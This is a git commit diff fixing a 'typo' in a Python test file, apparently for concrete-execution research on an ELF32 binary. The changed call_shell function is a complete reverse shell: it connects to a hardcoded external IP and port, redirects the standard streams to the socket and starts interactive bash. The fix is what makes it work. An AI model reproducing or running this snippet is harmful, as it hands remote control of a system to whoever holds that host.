58c1b0fe5cf23b006cb5541ab724f4ebd548d247
degrigis <degrigis@ucsb.edu>
2020-11-07 20:16:46 -0800

    typo
    Signed-off-by: degrigis <degrigis@ucsb.edu>

--- tests/test_concrete_not_packed_elf32.py
+++ tests/test_concrete_not_packed_elf32.py
@@ -37,7 +37,7 @@ avatar_gdb = None
 def call_shell():
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("128.111.48.60",31339))
-    s.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     subprocess.call(["/bin/bash","-i"])
